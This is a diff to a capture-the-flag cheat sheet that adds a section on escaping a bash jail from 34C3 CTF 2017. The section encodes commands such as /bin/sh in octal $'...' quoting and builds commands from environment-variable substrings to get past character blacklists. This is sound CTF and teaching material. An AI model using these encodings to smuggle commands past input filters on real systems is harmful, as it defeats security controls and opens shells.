@@ -12,6 +12,7 @@
   - [Dollar-zero variants](#dollar-zero-variants)
 - [Privilege Escalation Checklist (Post-Shell)](#privilege-escalation-checklist-post-shell)
 - [HISTFILE Trick for Restricted Shell File Reads (BCTF 2016)](#histfile-trick-for-restricted-shell-file-reads-bctf-2016)
+- [Bash Jail Bypass via $'...' Octal Encoding (34C3 CTF 2017)](#bash-jail-bypass-via--octal-encoding-34c3-ctf-2017)
 - [References](#references)
 
 ---
@@ -192,6 +193,31 @@ dlcall printf %s $m
 ```
 
 **Key insight:** Three ways to read files without standard utilities: (1) HISTFILE loading, (2) `bash -v` verbose mode, (3) `ctypes.sh` direct C library calls via `dlcall`.
+
+---
+
+## Bash Jail Bypass via $'...' Octal Encoding (34C3 CTF 2017)
+
+When a-z, `*`, `?`, `.` are banned, use `$'...'` ANSI-C quoting with octal escapes:
+
+```bash
+# Encode /get_flag as octal
+__=$'\057\147\145\164\137\146\154\141\147'
+$__  # executes /get_flag
+
+# Or encode any command character by character:
+# /bin/sh = $'\057\142\151\156\057\163\150'
+```
+
+Also: extract characters from existing environment variables:
+
+```bash
+# ${VARIABLE:START:LENGTH} extracts substrings
+# Build command from $PATH, $HOME, $OSTYPE, $HOSTNAME:
+/${OSTYPE:6:1}${HOSTNAME:2:1}${HOME:1:1}_${HOSTNAME:9:1}${PATH:5:1}...
+```
+
+**Key insight:** Bash's `$'...'` syntax interprets `\NNN` as octal byte values, allowing arbitrary string construction without using any alphabetic characters. Combined with environment variable substring extraction (`${VAR:offset:length}`), this bypasses nearly any character blacklist. The `__` variable name uses only underscores (often not blocked). When letters are banned but `$`, `'`, `\`, and digits are allowed, octal encoding in ANSI-C quotes is the primary escape vector.
 
 ---
 
